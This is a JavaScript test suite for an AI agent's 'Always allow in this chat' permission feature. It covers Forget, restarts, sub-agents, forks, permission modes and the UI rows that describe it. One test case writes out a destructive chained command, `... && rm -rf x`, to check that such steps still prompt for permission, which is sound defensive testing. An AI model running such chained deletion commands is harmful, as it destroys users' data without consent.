    assert.deepEqual(await chatRules(coderChat), [A, "node build.js"].map((pattern) => ({ tool: "bash", pattern, verdict: "allow", from: "chat" })));
  });

  // (fails before: yes — Forget knew no chat's row: 400 "from is session, project or learned")
  test("Forget, mid-turn: the command asks again at the turn's next request; a new chat never had it", async () => {
    const mid = await turn(coderChat, `~permbash node other.js ~then ${A}`);
    await asked(mid.runId);
    const f = await forget(coderChat, { tool: "bash", pattern: A, verdict: "allow", from: "chat" });
    assert.equal(f.status, 200, await f.clone().text());
    const gone = await f.json();
    assert.deepEqual(gone.forgot, [{ tool: "bash", pattern: A, verdict: "allow", from: "chat" }]);
    assert.deepEqual(gone.rulesInForce.filter((/** @type {any} */ r) => r.from === "chat").map((/** @type {any} */ r) => r.pattern), ["node build.js"]);
    assert.deepEqual(keptIn(coderChat).map((/** @type {any} */ k) => k.command), ["node build.js"]);
    await permit(mid.runId, "allow");
    const again = await asked(mid.runId, "q2");
    assert.deepEqual([again.form.judged.command, again.form.judged.keeps?.commands], [A, [A]], "it asks again, with its offer");
    await permit(mid.runId, "deny", "q2");
    assert.match(await said(mid.res), /permbash: allow-once then reject/);
    assert.equal((await forget(coderChat, { tool: "bash", pattern: A, verdict: "allow", from: "chat" })).status, 404, "forgotten already");
    // A new chat in the same folder keeps nothing of it.
    const other = await chat("coder/fake-a", coderDir);
    assert.deepEqual(await chatRules(other), []);
    const fresh = await turn(other, "~permbash node build.js --fast ~then node build.js");
    await asked(fresh.runId);
    await permit(fresh.runId, "deny");
    const second = await asked(fresh.runId, "q2");
    assert.equal(second.form.judged.command, "node build.js", "what the first chat keeps asks here");
    await permit(fresh.runId, "deny", "q2");
    await said(fresh.res);
  });

  // ---- the loop's own seat ----
  /** One turn of a loop's chat, answered whole, once the chat is free. @param {string} id @param {any} body */
  const say = async (id, body) => {
    const r = /** @type {Response} */ (await until(async () => {
      const x = await shim.api(`${S(id)}/turns`, { method: "POST", body: { stream: false, ...(typeof body === "string" ? { content: body } : body) } });
      return x.status === 409 && (await x.clone().json().catch(() => ({}))).holder ? null : x;
    }, "the chat free", { timeoutMs: 20_000 }));
    assert.equal(r.status, 200, await r.clone().text());
    return { words: text((await r.json()).content), runId: String(r.headers.get("x-filament-request-id")) };
  };
  const ASKS = /May I run this command\?/;
  /** The loop's chat that keeps `adds("a")`. */
  let loopChat = "";
  /** @type {any} */
  let loopKeeps = null;

  // (fails before: yes — the loop's ask carried no chat offer, and each of the command's runs paused the turn)
  test("the loop's seat: its ask carries the chat's offer, on the run and after a reload; pressed, the command runs unasked in the same turn and a later one", async () => {
    loopChat = await chat("agent/brain-model", loopDir);
    const first = await say(loopChat, run([adds("a"), `${adds("a")} 2>&1`]));
    assert.match(first.words, ASKS);
    const ask = (await runEvents(first.runId)).find((e) => e.type === "ask");
    loopKeeps = ask?.keeps;
    assert.deepEqual([loopKeeps?.hand, loopKeeps?.commands, ask?.offer], ["bash", [adds("a")], undefined], "the chat's offer, and no project one");
    assert.ok(sameFolder(loopKeeps.folder, loopDir));
    const tr = await (await shim.api(`${S(loopChat)}/transcript`)).json();
    assert.deepEqual(tr.paused?.keeps, loopKeeps, "the pause a reload draws carries it too");
    const pressed = await always(loopChat, { keeps: loopKeeps });
    assert.equal(pressed.status, 200, await pressed.clone().text());
    assert.deepEqual((await pressed.json()).kept, [adds("a")]);
    const went = await say(loopChat, { content: "yes", allow: true });
    assert.equal(went.words, "DONE: ran ran");
    assert.equal(ran(), "aa");
    assert.equal((await runEvents(went.runId)).some((e) => e.type === "ask"), false, "the second ran unasked, in the same turn");
    assert.ok((await changes(went.runId)).includes(`agent: bash ran on this chat's always-allow \`${adds("a")}\``), (await changes(went.runId)).join("\n"));
    const later = await say(loopChat, run([adds("a"), `cd "${loopKeeps.folder}" && ${adds("a")}`]));
    assert.equal(later.words, "DONE: ran ran");
    assert.equal(ran(), "aaaa");
    assert.equal((await runEvents(later.runId)).some((e) => e.type === "ask"), false);
  });

  // (fails before: yes — the kept command asked as any other)
  test("the loop's seat: another command, a redirect and a one-way step after it ask; Forget mid-turn makes the command ask again", async () => {
    for (const [command, keeps, what] of /** @type {[string, string[] | null, string][]} */ ([
      [adds("b"), [adds("b")], "another command: its own offer"],
      [`${adds("a")} > out.txt`, null, "a redirect"],
      [`${adds("a")} && rm -rf x`, null, "a one-way step after it"],
    ])) {
      const x = await say(loopChat, run([command]));
      assert.match(x.words, ASKS, what);
      assert.deepEqual((await runEvents(x.runId)).find((e) => e.type === "ask")?.keeps?.commands ?? null, keeps, what);
      assert.equal((await say(loopChat, { content: "no", allow: false })).words, "DONE: refused", what);
    }
    assert.equal(ran(), "aaaa", "none of them ran");
    const mid = await say(loopChat, run([adds("b"), adds("a")]));
    assert.match(mid.words, ASKS);
    assert.equal((await forget(loopChat, { tool: "bash", pattern: adds("a"), verdict: "allow", from: "chat" })).status, 200);
    const again = await say(loopChat, { content: "yes", allow: true });
    assert.match(again.words, ASKS, "the kept command, forgotten while the turn waited, asks");
    assert.equal(ran(), "aaaab");
    assert.equal((await say(loopChat, { content: "no", allow: false })).words, "DONE: ran refused");
    assert.equal(ran(), "aaaab");
  });

  // (fails before: yes — under Ask and under a team that writes the kept command paused the turn)
  test("the loop's seat under each mode and a team in charge: read-only and a team that changes no file still refuse; Ask and a team that writes run it unasked; Full access asks nothing", async () => {
    assert.equal((await always(loopChat, { keeps: loopKeeps })).status, 200);
    await settle(loopChat, { patch: { loop: { permissions: "read-only" } } });
    const ro = await say(loopChat, run([adds("a")]));
    assert.equal(ro.words, "DONE: refused");
    assert.ok((await changes(ro.runId)).includes("agent: bash refused (read-only mode)"), (await changes(ro.runId)).join("\n"));
    await settle(loopChat, { patch: { loop: { permissions: "ask" } } });
    const asks = await say(loopChat, run([adds("a")]));
    assert.equal(asks.words, "DONE: ran", "Ask mode, as a learned permission lifts there");
    await settle(loopChat, { patch: { loop: { permissions: "auto" } } });
    const auto = await say(loopChat, run([adds("a")]));
    assert.equal(auto.words, "DONE: ran");
    assert.equal((await changes(auto.runId)).some((c) => c.includes("always-allow")), false, "Full access asks nothing: nothing was lifted");
    assert.equal(ran(), "aaaabaa");
    await settle(loopChat, { patch: { loop: { permissions: "edit" } } });
    // A team that changes no file, in charge: each turn it leads only reads.
    await settle(loopChat, { patch: { engine: { mode: "team", team: "bughunters" } } });
    assert.equal((await say(loopChat, run([adds("a")]))).words, "DONE: refused");
    assert.equal(ran(), "aaaabaa");
    // A team that writes: its lead is in the chat's own seat.
    await settle(loopChat, { patch: { engine: { mode: "team", team: "builders" } } });
    const led = await say(loopChat, run([adds("a")]));
    assert.equal(led.words, "DONE: ran");
    assert.ok((await changes(led.runId)).includes(`agent: bash ran on this chat's always-allow \`${adds("a")}\``), (await changes(led.runId)).join("\n"));
    assert.equal(ran(), "aaaabaaa");
    await settle(loopChat, { unset: ["engine.mode", "engine.team"] });
  });

  // (fails before: no — guards: a sub-agent rides its chat's chain, a fork copies the meta it lists, and neither may
  // come to run what the chat kept)
  test("a sub-agent of the chat, a fork of it and a new chat have none of it", async () => {
    const spawn = await shim.api(`${S(loopChat)}/subagents`, { method: "POST", body: { prompt: run([adds("s")]), description: "Run it" } });
    assert.equal(spawn.status, 200, await spawn.clone().text());
    const sid = String((await spawn.json()).subagent.id);
    // What the chat keeps for its own seat: the sub-agent's very command.
    const archive = /** @type {any} */ (shim.app.memory.archive);
    archive.mergeMeta(loopChat, { alwaysRun: [...keptIn(loopChat), { command: adds("s"), hand: "bash", folder: loopKeeps.folder, at: 1 }] });
    const waiting = await until(async () => (await (await shim.api(`${S(loopChat)}/asks`)).json()).asks.find((/** @type {any} */ x) => x.from === sid) || null, "the sub-agent's call to wait", { timeoutMs: 20_000 });
    assert.ok(waiting, "it asks: the chat's always-allow is not its own");
    assert.equal(ran().includes("s"), false);
    assert.equal((await shim.api(`${S(loopChat)}/subagents/${sid}/stop`, { method: "POST", body: {} })).status, 200);
    const fork = await (await shim.api(`${S(loopChat)}/fork`, { method: "POST", body: { atTurn: 1 } })).json();
    assert.ok(fork.chainId, JSON.stringify(fork));
    assert.deepEqual([archive.getChain(fork.chainId)?.meta?.alwaysRun, await chatRules(fork.chainId)], [undefined, []]);
    const other = await chat("agent/brain-model", loopDir);
    assert.match((await say(other, run([adds("a")]))).words, ASKS);
    assert.equal((await say(other, { content: "no", allow: false })).words, "DONE: refused");
  });

  // (fails before: yes — nothing was kept to survive one)
  test("a restart keeps it: a new Filament over the same archive lists it and runs the command unasked", async () => {
    const before = ran();
    const dataDir = shim.dataDir;
    await shim.stop();
    shim = await start({ dataDir });
    assert.ok((await chatRules(loopChat)).some((/** @type {any} */ r) => r.pattern === adds("a")), JSON.stringify(await chatRules(loopChat)));
    assert.deepEqual((await chatRules(coderChat)).map((/** @type {any} */ r) => r.pattern), ["node build.js"]);
    const went = await say(loopChat, run([adds("a")]));
    assert.equal(went.words, "DONE: ran");
    assert.equal(ran(), `${before}a`);
    assert.equal((await runEvents(went.runId)).some((e) => e.type === "ask"), false);
  });
});

// ---- the page -------------------------------------------------------------------------------------------------------

describe("the page: the card's row, its toast, and Remembered rules (d-allow §6)", () => {
  const keeps = { hand: "bash", folder: "/work/proj", commands: [A] };
  const place = (/** @type {any} */ parent, /** @type {any[]} */ wanted) => parent.replaceChildren(...wanted);

  // (fails before: yes — the card drew Allow and Deny alone for such a command)
  test("the permission block: Always allow in this chat after Allow, saying exactly what it keeps; pressed, it calls its callback and then answers allow", () => {
    /** @type {any[]} */
    const did = [];
    const cb = { onAnswer: (/** @type {any} */ a) => did.push(["answer", a]), onAlways: (/** @type {any} */ o) => did.push(["project", o]), onAlwaysInChat: (/** @type {any} */ k) => did.push(["chat", k]) };
    const paused = { kind: "permission", tool: "bash", command: `cd /work/proj && ${A} 2>&1 | tail -20`, question: "May I run this command?", keeps };
    const el = /** @type {any} */ (permissionBlock({ paused }, cb, { h: fakeH }));
    assert.deepEqual(rows(el).map((r) => textOf(r)), ["Allow|only this time", `Always allow in this chat|don't ask again to run exactly |${A}`, "Deny|reject it for now"]);
    assert.deepEqual(codes(rows(el)[1]).map((c) => textOf(c)), [A], "the kept command in code marks, no backtick drawn");
    rows(el)[1].dispatch("dblclick");
    assert.deepEqual(did, [["chat", keeps], ["answer", { allow: true, words: "" }]], "the always first, then a plain allow");
    // Chosen with the arrows and sent with Enter, as any row.
    el.dispatch("keydown", { key: "ArrowDown", target: null });
    el.dispatch("keydown", { key: "Enter", target: null });
    assert.deepEqual(did.slice(2), [["chat", keeps], ["answer", { allow: true, words: "" }]]);
    // Where the kept text is the command the card shows, or long: "this command", the text its row's title.
    const whole = /** @type {any} */ (permissionBlock({ paused: { ...paused, command: A } }, cb, { h: fakeH }));
    assert.deepEqual([textOf(rows(whole)[1]), rows(whole)[1].attrs.title], ["Always allow in this chat|don't ask again to run exactly this command", A]);
    const long = `node --test ${Array.from({ length: 8 }, (_, i) => `test/file-number-${i}.test.js`).join(" ")}`;
    const wide = /** @type {any} */ (permissionBlock({ paused: { ...paused, keeps: { ...keeps, commands: [long] } } }, cb, { h: fakeH }));
    assert.deepEqual([textOf(rows(wide)[1]), rows(wide)[1].attrs.title], ["Always allow in this chat|don't ask again to run exactly this command", long]);
    const two = /** @type {any} */ (permissionBlock({ paused: { ...paused, keeps: { ...keeps, commands: ["node a.js", "node b.js"] } } }, cb, { h: fakeH }));
    assert.equal(textOf(rows(two)[1]), "Always allow in this chat|don't ask again to run exactly |node a.js| and |node b.js");
    // One always-row a card: the project's stands alone; a review rule's ask and an agent's only-always have none.
    const both = /** @type {any} */ (permissionBlock({ paused: { ...paused, offer: { itemId: null, tool: "bash", shape: "npm test" } } }, cb, { h: fakeH }));
    assert.deepEqual(rows(both).map((r) => textOf(r).split("|")[0]), ["Allow", "Always allow in this project", "Deny"]);
    for (const more of [{ review: "bash(node *) review" }, { always: true }, { keeps: { ...keeps, commands: [] } }, { keeps: undefined }]) {
      const none = /** @type {any} */ (permissionBlock({ paused: { ...paused, ...more } }, cb, { h: fakeH, look: /** @type {any} */ (() => ({ el: fakeH("div") })) }));
      assert.equal(rows(none).some((r) => textOf(r).startsWith("Always allow in this chat")), false, JSON.stringify(more));
    }
  });

  // (fails before: yes — neither the pause nor a coding agent's form carried the offer to the block)
  test("the loop's own pause and a coding agent's ask draw the same row, and its press goes to the page's keeper before the answer", () => {
    /** @type {any[]} */
    const did = [];
    const io = /** @type {any} */ ({
      answer: () => {},
      permit: (/** @type {any} */ chat, /** @type {any} */ a) => did.push(["permit", chat.id, a.allow]),
      always: () => did.push(["project"]),
      alwaysInChat: (/** @type {any} */ chat, /** @type {any} */ k) => did.push(["chat", chat.id, k]),
      workerAnswer: async () => true,
      workerAlways: async () => true,
      reveal: () => {},
      agentAnswer: async () => "",
      agentPlan: async () => "",
      agentPermission: (/** @type {any} */ chat, /** @type {any} */ ask, /** @type {any} */ x) => did.push(["agent", chat.id, ask.id, x.allow]),
      open: () => {},
    });
    const command = `${A} 2>&1 | tail -20`;
    // The loop's pause, as the run's ask and the transcript give it.
    const paused = labels.pauseOf({ kind: "permission", tool: "bash", question: "May I run this command?", command, keeps });
    assert.deepEqual(/** @type {any} */ (paused).keeps, keeps);
    const own = createDecisions(io, { h: fakeH, place, later: () => {} });
    own.paint(/** @type {any} */ ({ chat: { id: "c1", turns: [{ n: 1, paused }] }, rows: [], view: "chat", team: null }));
    assert.equal(textOf(rows(own.el.kids[0])[1]), `Always allow in this chat|don't ask again to run exactly |${A}`);
    rows(own.el.kids[0])[1].dispatch("dblclick");
    // A coding agent's request the switch asks about.
    const form = fromJudged(/** @type {any} */ ({ agent: "Claude", call: "cb1", tool: "bash", words: "May I run this command?", command, keeps }));
    assert.deepEqual(/** @type {any} */ (form.judged)?.keeps, keeps, "the form carries it beside the project's offer");
    const theirs = createDecisions(io, { h: fakeH, place, later: () => {} });
    theirs.paint(/** @type {any} */ ({ chat: { id: "c2", turns: [{ waiting: [{ type: "ask", round: 1, id: "q1", runId: "run_1", kind: "permission", waits: true, form }] }] }, rows: [], view: "chat", team: null }));
    assert.equal(textOf(rows(theirs.el.kids[0])[1]), `Always allow in this chat|don't ask again to run exactly |${A}`);
    rows(theirs.el.kids[0])[1].dispatch("dblclick");
    assert.deepEqual(did, [["chat", "c1", keeps], ["permit", "c1", true], ["chat", "c2", keeps], ["agent", "c2", "q1", true]]);
  });

  // (fails before: yes — no such words: `keepsWords` and `keptToast` are new)
  test("the words: what the row says of one command, of several and of a long one; the toast, as the project's has one", () => {
    const { keepsWords, keptToast } = /** @type {any} */ (labels);
    assert.deepEqual(keepsWords(keeps, `${A} | tail -20`), { words: `don't ask again to run exactly \`${A}\``, title: "" });
    assert.deepEqual(keepsWords(keeps, ` ${A}\n`), { words: "don't ask again to run exactly this command", title: A });
    assert.deepEqual(keepsWords({ ...keeps, commands: ["node a.js", "node b.js", "node c.js"] }, "x"), { words: "don't ask again to run exactly `node a.js`, `node b.js` and `node c.js`", title: "" });
    const many = Array.from({ length: 4 }, (_, i) => `node --test test/a-long-file-name-${i}.test.js`);
    assert.deepEqual(keepsWords({ ...keeps, commands: many }, "x"), { words: "don't ask again to run exactly these commands", title: many.join("\n") });
    assert.equal(keptToast([A]), `Always allowed in this chat: ${A}. The permission switch lists it, with Forget`);
    assert.equal(keptToast(["node a.js", "node b.js"]), "Always allowed in this chat: node a.js and node b.js. The permission switch lists them, with Forget");
  });

  // (fails before: yes — the row's source read "chat", the layer's own word)
  test("Remembered rules lists the chat's own, in words, with Forget", () => {
    /** @type {any[][]} */
    const menus = [];
    /** @type {any[]} */
    const forgot = [];
    const sw = createModeSwitch({ onForget: (r) => forgot.push(r) }, { h: /** @type {any} */ (fakeH), drawIn: fakeDrawIn, menu: /** @type {any} */ ((/** @type {any[]} */ items) => { menus.push(items); return { el: fakeH("div"), close() {} }; }) });
    const rules = [
      { tool: "bash", pattern: A, verdict: "allow", from: "chat" },
      { tool: "powershell", pattern: "node build.js", verdict: "allow", from: "chat" },
      { tool: "bash", pattern: "npm test", verdict: "allow", from: "learned" },
    ];
    sw.setRules(rules);
    /** @type {any} */ (sw.el).dispatch("click");
    const items = menus.at(-1) || [];
    const at = items.findIndex((i) => i.type === "label" && i.label === "Remembered rules");
    const drawn = items.slice(at + 1).map((i) => i.node);
    assert.deepEqual(drawn.map((n) => textOf(n)), [
      `Runs |${A}| without asking|From Always allow in this chat|Forget`,
      "Runs |node build.js| without asking|From Always allow in this chat|Forget",
      "Runs |npm test| without asking|From Always allow in this project|Forget",
    ]);
    buttonsOf(drawn[0]).find((b) => textOf(b) === "Forget").dispatch("click");
    assert.deepEqual(forgot, [rules[0]], "the row as listed goes to the server's Forget");
  });
});
